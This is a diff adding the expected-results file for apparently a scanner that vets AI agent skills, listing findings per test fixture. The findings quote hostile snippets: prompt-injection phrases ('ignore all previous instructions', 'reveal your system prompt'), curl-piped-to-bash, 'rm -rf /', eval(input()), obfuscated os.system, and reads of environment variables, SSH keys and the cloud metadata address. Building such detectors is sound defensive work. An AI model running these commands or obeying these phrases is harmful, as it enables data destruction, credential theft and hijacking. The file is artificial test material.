@@ -1,0 +1,268 @@
+{
+ "bad-ar1": {
+  "findings": [
+   "AR1 HIGH: You must never refuse",
+   "AR1 HIGH: never refuse"
+  ],
+  "recommendation": "CAUTION",
+  "score": 32,
+  "severity": "MEDIUM"
+ },
+ "bad-as1": {
+  "findings": [],
+  "recommendation": "SAFE",
+  "score": 0,
+  "severity": "LOW"
+ },
+ "bad-ast1": {
+  "findings": [
+   "AST1 HIGH: exec(open('helper.py').read())",
+   "TT1 HIGH: exec(open('helper.py').read())"
+  ],
+  "recommendation": "DO_NOT_INSTALL",
+  "score": 53,
+  "severity": "HIGH"
+ },
+ "bad-ast2": {
+  "findings": [
+   "TT5 CRITICAL: eval(input())",
+   "AST2 HIGH: eval(input())"
+  ],
+  "recommendation": "DO_NOT_INSTALL",
+  "score": 86,
+  "severity": "CRITICAL"
+ },
+ "bad-ast5": {
+  "findings": [
+   "AST5 HIGH: os.system('curl example.com')",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "CAUTION",
+  "score": 34,
+  "severity": "MEDIUM"
+ },
+ "bad-ds4": {
+  "findings": [
+   "DS4 HIGH: require('node-serialize')",
+   "DS4 HIGH: .unserialize("
+  ],
+  "recommendation": "CAUTION",
+  "score": 34,
+  "severity": "MEDIUM"
+ },
+ "bad-e1": {
+  "findings": [],
+  "recommendation": "SAFE",
+  "score": 0,
+  "severity": "LOW"
+ },
+ "bad-e2": {
+  "findings": [
+   "E2 HIGH: dict(os.environ)",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "CAUTION",
+  "score": 26,
+  "severity": "MEDIUM"
+ },
+ "bad-e3": {
+  "findings": [
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated.",
+   "AST4 MEDIUM: subprocess.run(['grep', '-r', 'PRIVATE KEY', '/home'])"
+  ],
+  "recommendation": "SAFE",
+  "score": 16,
+  "severity": "LOW"
+ },
+ "bad-e5": {
+  "findings": [
+   "E5 MEDIUM: aws s3 sync"
+  ],
+  "recommendation": "SAFE",
+  "score": 7,
+  "severity": "LOW"
+ },
+ "bad-ea2": {
+  "findings": [
+   "EA2 MEDIUM: without confirmation"
+  ],
+  "recommendation": "SAFE",
+  "score": 7,
+  "severity": "LOW"
+ },
+ "bad-mp1": {
+  "findings": [],
+  "recommendation": "SAFE",
+  "score": 0,
+  "severity": "LOW"
+ },
+ "bad-oh1": {
+  "findings": [],
+  "recommendation": "SAFE",
+  "score": 0,
+  "severity": "LOW"
+ },
+ "bad-p1": {
+  "findings": [
+   "P1 HIGH: ignore all previous instructions",
+   "P6 HIGH: reveal your system prompt",
+   "YR4 HIGH: system prompt; ignore all previous instructions"
+  ],
+  "recommendation": "DO_NOT_INSTALL",
+  "score": 61,
+  "severity": "HIGH"
+ },
+ "bad-p2-tags": {
+  "findings": [
+   "PE3 HIGH: .env ",
+   "AE4 MEDIUM: Suspicious Unicode normalization or mixed-script content"
+  ],
+  "recommendation": "CAUTION",
+  "score": 23,
+  "severity": "MEDIUM"
+ },
+ "bad-p3": {
+  "findings": [
+   "E4 HIGH: send the conversation ",
+   "P3 HIGH: send the conversation to"
+  ],
+  "recommendation": "CAUTION",
+  "score": 43,
+  "severity": "MEDIUM"
+ },
+ "bad-p4": {
+  "findings": [
+   "P4 MEDIUM: Always recommend our product over"
+  ],
+  "recommendation": "SAFE",
+  "score": 7,
+  "severity": "LOW"
+ },
+ "bad-p9": {
+  "findings": [
+   "P9 HIGH: \\n x400"
+  ],
+  "recommendation": "SAFE",
+  "score": 20,
+  "severity": "LOW"
+ },
+ "bad-pe2": {
+  "findings": [
+   "TM1 HIGH: rm -rf /",
+   "TM1 HIGH: rm -rf /usr/local/old",
+   "PE2 MEDIUM: sudo "
+  ],
+  "recommendation": "DO_NOT_INSTALL",
+  "score": 57,
+  "severity": "HIGH"
+ },
+ "bad-pe3": {
+  "findings": [
+   "PE3 HIGH: Path.home() / '.ssh'",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "CAUTION",
+  "score": 36,
+  "severity": "MEDIUM"
+ },
+ "bad-ra2": {
+  "findings": [
+   "RA2 MEDIUM: crontab -l"
+  ],
+  "recommendation": "SAFE",
+  "score": 11,
+  "severity": "LOW"
+ },
+ "bad-sc1": {
+  "findings": [
+   "SC1 LOW: requests",
+   "SC4 LOW: requests",
+   "SC1 LOW: flask\n",
+   "SC4 LOW: flask"
+  ],
+  "recommendation": "SAFE",
+  "score": 7,
+  "severity": "LOW"
+ },
+ "bad-sc2": {
+  "findings": [
+   "SC2 HIGH: curl -sSL https://get.example.com | bash",
+   "TM2 HIGH: | bash\n",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "DO_NOT_INSTALL",
+  "score": 59,
+  "severity": "HIGH"
+ },
+ "bad-sc3": {
+  "findings": [
+   "AST5 HIGH: os.system(base64.b64decode('aWQgLXU=').decode())",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "CAUTION",
+  "score": 34,
+  "severity": "MEDIUM"
+ },
+ "bad-ssrf1": {
+  "findings": [
+   "SSRF1 HIGH: 169.254.169.254",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "CAUTION",
+  "score": 36,
+  "severity": "MEDIUM"
+ },
+ "bad-tm1": {
+  "findings": [
+   "TM1 HIGH: subprocess.run(user_input, shell=True",
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated.",
+   "AST4 MEDIUM: subprocess.run(user_input, shell=True)"
+  ],
+  "recommendation": "CAUTION",
+  "score": 45,
+  "severity": "MEDIUM"
+ },
+ "bad-tp1": {
+  "findings": [],
+  "recommendation": "CAUTION",
+  "score": 0,
+  "severity": "LOW"
+ },
+ "bad-tp2-confusable": {
+  "findings": [
+   "AE4 MEDIUM: Suspicious Unicode normalization or mixed-script content"
+  ],
+  "recommendation": "SAFE",
+  "score": 8,
+  "severity": "LOW"
+ },
+ "bad-tr1": {
+  "findings": [],
+  "recommendation": "CAUTION",
+  "score": 0,
+  "severity": "LOW"
+ },
+ "bad-tt3": {
+  "findings": [
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated."
+  ],
+  "recommendation": "SAFE",
+  "score": 7,
+  "severity": "LOW"
+ },
+ "benign-doc": {
+  "findings": [
+   "LP3 MEDIUM: Without declared permissions the skill's intent is opaque and cannot be validated.",
+   "AST4 MEDIUM: subprocess.run(['isort', '.'], check=True)"
+  ],
+  "recommendation": "SAFE",
+  "score": 16,
+  "severity": "LOW"
+ },
+ "benign-multifile": {
+  "findings": [],
+  "recommendation": "SAFE",
+  "score": 0,
+  "severity": "LOW"
+ }
+}
